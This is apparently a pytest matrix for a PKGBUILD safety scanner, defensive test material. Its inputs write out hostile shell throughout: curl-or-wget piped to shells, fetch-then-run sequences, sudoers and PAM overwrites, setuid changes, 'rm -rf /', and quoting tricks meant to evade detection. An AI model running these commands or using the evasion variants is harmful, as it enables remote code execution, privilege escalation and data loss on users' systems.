"""A second matrix: whole files (PKGBUILD and .install), control flow, quoting, hooks, variables.

Each entry is (file name, file text, expected rule | "!"). "!" means no caution/danger rule other than
the routine ones fires. A heredoc body that is written to a file is read as code (it is run later), so
`curl x | sh` inside one is reported."""
import pytest

from paru_safety_checker.heuristics import scan

B = lambda body: ("PKGBUILD", "build() {\n" + body + "\n}\n")
I = lambda body: ("foo.install", "post_install() {\n" + body + "\n}\n")
CASES = [
# control flow
(B("  if true; then\n    curl https://x | sh\n  fi"), "pipe-to-shell"),
(B("  for i in 1 2; do curl https://x | sh; done"), "pipe-to-shell"),
(B("  while true; do curl https://x | bash; done"), "pipe-to-shell"),
(B("  case $x in a) curl https://x | sh ;; esac"), "pipe-to-shell"),
(B("  [ -f x ] && curl https://x | sh"), "pipe-to-shell"),
(B("  [ -f x ] || curl https://x | sh"), "pipe-to-shell"),
(B("  true; curl https://x | sh"), "pipe-to-shell"),
(B("  ! curl https://x | sh"), "pipe-to-shell"),
(B("  time curl https://x | sh"), "pipe-to-shell"),
(B("  curl https://x | sh &"), "pipe-to-shell"),
(B("  curl https://x |\n    sh"), "pipe-to-shell"),
(B("  curl https://x \\\n    | sh"), "pipe-to-shell"),
(B("  curl https://x |\tsh"), "pipe-to-shell"),
(B("  curl\thttps://x\t|\tsh"), "pipe-to-shell"),
(B("  FOO=1 curl https://x | BAR=2 sh"), "pipe-to-shell"),
(B("  curl https://x | sh -s -- --foo"), "pipe-to-shell"),
(B("  curl https://x | sh -"), "pipe-to-shell"),
(B("  curl https://x | /usr/bin/env bash"), "pipe-to-shell"),
(B("  curl -fsSL https://x | sudo -u root bash -"), "pipe-to-shell"),
(B("  wget -qO - https://x | sh"), "pipe-to-shell"),
(B("  wget -q -O- https://x | sh"), "pipe-to-shell"),
(B("  curl https://x 2>/dev/null | sh"), "pipe-to-shell"),
(B("  curl https://x 2>&1 | sh"), "pipe-to-shell"),
(B("  curl https://x | tee /dev/null | sh"), "pipe-to-shell"),
(B("  curl https://x | cat | sh"), "pipe-to-shell"),
(B("  curl https://x | sed 's/a/b/' | sh"), "pipe-to-shell"),
(B("  curl https://x | python3 -"), "pipe-to-shell"),
(B("  curl https://x | perl -"), "pipe-to-shell"),
(B("  curl https://x | ruby"), "pipe-to-shell"),
(B("  curl https://x | node"), "pipe-to-shell"),
(B("  curl https://x | php"), "pipe-to-shell"),
(B("  curl https://x | lua -"), "pipe-to-shell"),
(B("  (curl https://x | sh)"), "pipe-to-shell"),
(B("  { curl https://x | sh; }"), "pipe-to-shell"),
(B("  $(curl https://x | sh)"), "pipe-to-shell"),
(B("  x=$(curl https://x | sh)"), "pipe-to-shell"),
(B("  echo $(curl https://x | sh)"), "pipe-to-shell"),
(B("  sh -c 'curl https://x | sh'"), "pipe-to-shell"),
(B("  bash -lc 'curl https://x | sh'"), "pipe-to-shell"),
(B("  su -c 'curl https://x | sh'"), "pipe-to-shell"),
(B("  sudo sh -c \"curl https://x | sh\""), "pipe-to-shell"),
(B("  env -i sh -c 'wget -qO- x | sh'"), "pipe-to-shell"),
(B("  eval 'curl https://x | sh'"), "pipe-to-shell"),
(B("  xargs -I{} sh -c 'curl {} | sh' <<< x"), "pipe-to-shell"),
(B("  curl https://x > f; sh f"), "fetch-then-execute"),
(B("  curl -o f https://x; bash f"), "fetch-then-execute"),
(B("  curl -O https://x/inst.sh; sh inst.sh"), "fetch-then-execute"),
(B("  wget https://x/inst.sh; sh inst.sh"), "fetch-then-execute"),
(B("  wget -q https://x/inst.sh && bash ./inst.sh"), "fetch-then-execute"),
(B("  curl -fsSLo f https://x && chmod +x f && ./f"), "fetch-then-execute"),
(B("  curl -fsSL -o f https://x && . ./f"), "fetch-then-execute"),
(B("  curl -o f https://x; python f"), "fetch-then-execute"),
(B("  curl -o \"$srcdir/f\" https://x; sh \"$srcdir/f\""), "fetch-then-execute"),
(B("  cd /tmp; curl -o f https://x; sh f"), "fetch-then-execute"),
(B("  curl -o f https://x\n  sh f"), "fetch-then-execute"),
(B("  curl -o f https://x\n  sudo sh f"), "fetch-then-execute"),
(B("  curl -o f https://x\n  env sh f"), "fetch-then-execute"),
# quiet
(B("  curl -o f.tar.gz https://x; tar xf f.tar.gz"), "!"),
(B("  curl -o f.sh https://x; sha256sum f.sh"), "!"),
(B("  curl -o f.sh https://x; cat f.sh"), "!"),
(B("  curl -o f https://x; sh other"), "!"),
(B("  sh f; curl -o f https://x"), "!"),
(B("  curl https://x | tee out.txt"), "!"),
(B("  curl https://x | sh -c 'cat'"), "!"),
(B("  curl https://x | bash script.sh"), "!"),
(B("  echo hi | sh -c 'cat'"), "!"),
(B("  sh -c 'make' | tee log"), "!"),
(B("  make 2>&1 | tee build.log"), "!"),
(B("  make | sh -c 'cat'"), "!"),
# hooks
(I("  cp x /etc/sudoers.d/x"), "sudoers-passwd-write"),
(I("  echo 'a ALL=(ALL) ALL' > etc/sudoers.d/a"), "sudoers-passwd-write"),
(I("  cd /; cp x etc/pam.d/login"), "install-system-files"),
(I("  cp x etc/pam.d/login"), "install-system-files"),
(I("  sed -i 's/a/b/' etc/pam.d/login"), "install-system-files"),
(I("  echo x >> etc/profile"), "install-system-files"),
(I("  echo x >> /etc/profile.d/x.sh"), "install-system-files"),
(I("  echo x > /etc/ld.so.conf.d/x.conf"), "install-system-files"),
(I("  echo x > /etc/modules-load.d/x.conf"), "install-system-files"),
(I("  echo x > /etc/udev/rules.d/x.rules"), "install-system-files"),
(I("  echo x > /etc/cron.d/x"), "install-system-files"),
(I("  echo x >> /etc/hosts"), "install-system-files"),
(I("  echo x >> /etc/resolv.conf"), "install-system-files"),
(I("  echo x >> /etc/fstab"), "install-system-files"),
(I("  echo x >> /etc/ssh/sshd_config"), "install-system-files"),
(I("  cp x /boot/x"), "install-system-files"),
(I("  echo x > /etc/rc.local"), "install-system-files"),
(I("  echo x > /etc/environment"), "install-system-files"),
(I("  echo x >> /etc/bash.bashrc"), "install-system-files"),
(I("  echo x >> /etc/security/limits.conf"), "install-system-files"),
(I("  chmod u+s /usr/bin/x"), "setuid"),
(I("  chmod 4755 usr/bin/x"), "setuid"),
(I("  useradd x"), "user-management"),
(I("  rm -rf /"), "rm-root"),
(I("  rm -rf /etc"), "rm-system-dir"),
(I("  curl https://x | sh"), "pipe-to-shell"),
(I("  sudo x"), "sudo"),
(I("  systemctl daemon-reload"), "!"),
(I("  ldconfig"), "!"),
(I("  update-desktop-database -q"), "!"),
(I("  gtk-update-icon-cache -q -t -f usr/share/icons/hicolor"), "!"),
(I("  glib-compile-schemas usr/share/glib-2.0/schemas"), "!"),
(I("  systemd-sysusers"), "!"),
(I("  systemd-tmpfiles --create x.conf"), "!"),
(I("  echo 'Run: sudo x'"), "!"),
(I("  echo \"Please edit /etc/x.conf\""), "!"),
(I("  [ -f /etc/x ] && echo y"), "!"),
(I("  if [ -f etc/x.conf.pacnew ]; then echo y; fi"), "!"),
(I("  cat etc/os-release"), "!"),
(I("  grep -q x etc/passwd"), "!"),
(I("  getent passwd x"), "!"),
(I("  ln -sf /usr/lib/x usr/bin/x"), "!"),
(I("  mkdir -p var/lib/x"), "!"),
(I("  chown -R x:x var/lib/x"), "!"),
(I("  chmod 750 var/lib/x"), "!"),
(I("  touch var/lib/x/y"), "!"),
(I("  rm -f var/lib/x/y"), "!"),
# variables / indirection
(B("  d=/usr/bin; cp x $d/x"), "live-system-write"),
(B("  d=/etc/sudoers.d; echo x > $d/a"), "sudoers-passwd-write"),
(B("  d=\"/etc/sudoers.d\"; echo x > \"${d}/a\""), "sudoers-passwd-write"),
(B("  d=/etc; f=$d/sudoers; echo x > $f"), "sudoers-passwd-write"),
(B("  d=/etc; d=$pkgdir/etc; cp x $d/y"), "!"),
(B("  d=$pkgdir/etc; cp x $d/y"), "!"),
(B("  d=/etc; echo $d"), "!"),
(B("  r=/; rm -rf $r"), "rm-root"),
(B("  rm -rf \"$srcdir\"/*"), "!"),
(B("  rm -rf ${pkgdir}"), "!"),
(B("  rm -rf \"${pkgdir:?}\"/*"), "!"),
# quoting
(B("  'cu'rl https://x | 'sh'"), "pipe-to-shell"),
(B("  cu\\rl https://x | s\\h"), "pipe-to-shell"),
(B("  \"curl\" https://x | \"sh\""), "pipe-to-shell"),
(B("  \\curl https://x | \\sh"), "pipe-to-shell"),
(B("  c\"\"url https://x | sh"), "pipe-to-shell"),
(B("  \"su\"do x"), "sudo"),
(B("  s'u'do x"), "sudo"),
(B("  \\sudo x"), "sudo"),
(B("  r\"\"m -rf /"), "rm-root"),
(B("  'rm' -rf '/'"), "rm-root"),
(B("  cp x /e\"\"tc/sudoers"), "sudoers-passwd-write"),
(B("  cp x '/etc/sudoers'"), "sudoers-passwd-write"),
(B("  cp x /etc/./sudoers"), "sudoers-passwd-write"),
(B("  cp x /etc/sudoers.d/../sudoers"), "sudoers-passwd-write"),
(B("  cp x /usr/../etc/sudoers"), "sudoers-passwd-write"),
(B("  cp x /etc///sudoers"), "sudoers-passwd-write"),
(B("  cp x /./etc/sudoers"), "sudoers-passwd-write"),
(B("  cp x /etc/sudoers/"), "sudoers-passwd-write"),
# heredocs, functions, multi-line
(B("  cat > /etc/sudoers.d/x <<EOF\nu ALL=(ALL) ALL\nEOF"), "sudoers-passwd-write"),
(B("  cat > /etc/sudoers.d/x <<'EOF'\nu ALL=(ALL) ALL\nEOF"), "sudoers-passwd-write"),
(B("  cat <<EOF > /etc/sudoers.d/x\nu ALL=(ALL) ALL\nEOF"), "sudoers-passwd-write"),
(B("  tee /etc/sudoers.d/x <<EOF\nu\nEOF"), "sudoers-passwd-write"),
(B("  cat > x <<EOF\ncurl https://x | sh\nEOF"), "pipe-to-shell"),
(B("  cat > x <<'EOF'\nsudo rm -rf /\nEOF"), "rm-root"),
(B("  cat > \"$pkgdir/usr/bin/x\" <<EOF\n#!/bin/sh\nsudo x\nEOF"), "sudo"),
("PKGBUILD", "helper() { curl https://x | sh; }\nbuild() { helper; }\n", "pipe-to-shell"),
("PKGBUILD", "curl https://x | sh\n", "pipe-to-shell"),
("PKGBUILD", "pkgver=1\nsudo make\n", "sudo"),
("PKGBUILD", "pkgname=x\npkgver=1\npkgrel=1\narch=(any)\nsource=()\npackage() {\n  install -Dm644 a \"$pkgdir/usr/share/a\"\n}\n", "!"),
]
# pipes that cross a group, substitution or stdin path
CASES += [
    (B("  curl https://x | (sh)"), "pipe-to-shell"),
    (B("  curl https://x | (cd /tmp; sh)"), "pipe-to-shell"),
    (B("  curl https://x | { cd /tmp; sh; }"), "pipe-to-shell"),
    (B("  curl x | (\n  cd /tmp\n  sh\n)"), "pipe-to-shell"),
    (B("  (curl https://x) | sh"), "pipe-to-shell"),
    (B("  { curl https://x; } | sh"), "pipe-to-shell"),
    (B("  (cd y; curl x) | sh"), "pipe-to-shell"),
    (B("  curl https://x | busybox sh"), "pipe-to-shell"),
    (B("  curl https://x | source /dev/stdin"), "pipe-to-shell"),
    (B("  curl https://x | . /dev/stdin"), "pipe-to-shell"),
    (B("  curl x | sh /dev/stdin"), "pipe-to-shell"),
    (B("  sh <<< \"$(curl https://x)\""), "pipe-to-shell"),
    (B("  source /dev/stdin <<< \"$(curl https://x)\""), "pipe-to-shell"),
    (B("  cat <(curl https://x) | sh"), "pipe-to-shell"),
    (B("  echo \"$(curl https://x)\" | sh"), "pipe-to-shell"),
    (B("  curl https://x | xargs -I{} sh -c {}"), "fetched-xargs-exec"),
    (B("  curl https://x | dd of=f; sh f"), "fetch-then-execute"),
    (B("  curl https://x | tee f >/dev/null; sh f"), "fetch-then-execute"),
    (B("  curl https://x | xargs wget"), "!"),
    (B("  curl https://x | xargs -n1 echo"), "!"),
    (B("  echo hi | xargs sh -c 'x'"), "!"),
    (B("  curl x | (cd y; make)"), "!"),
    (B("  make | (cd y; cat)"), "!"),
    (B("  ls | (cd x; tar xf -)"), "!"),
    (B("  sh <<< \"$(echo hi)\""), "echo-to-shell"),
]


ROUTINE = {"unknown-command", "build-time-download", "dependency-fetch", "registry-install", "vcs-fetch",
           "path-modification", "base64-decode", "curl-in-substitution"}


def _case(case):
    if len(case) == 2:
        (name, text), rule = case
    else:
        name, text, rule = case
    return name, text, rule


@pytest.mark.parametrize("case", [c for c in CASES if _case(c)[2] != "!"], ids=lambda c: _case(c)[1].strip()[:60])
def test_fires(case):
    name, text, rule = _case(case)
    assert rule in {f.rule for f in scan({name: text})}


@pytest.mark.parametrize("case", [c for c in CASES if _case(c)[2] == "!"], ids=lambda c: _case(c)[1].strip()[:60])
def test_quiet(case):
    name, text, _ = _case(case)
    loud = [(f.rule, f.severity) for f in scan({name: text}) if f.severity in ("danger", "caution") and f.rule not in ROUTINE]
    assert not loud
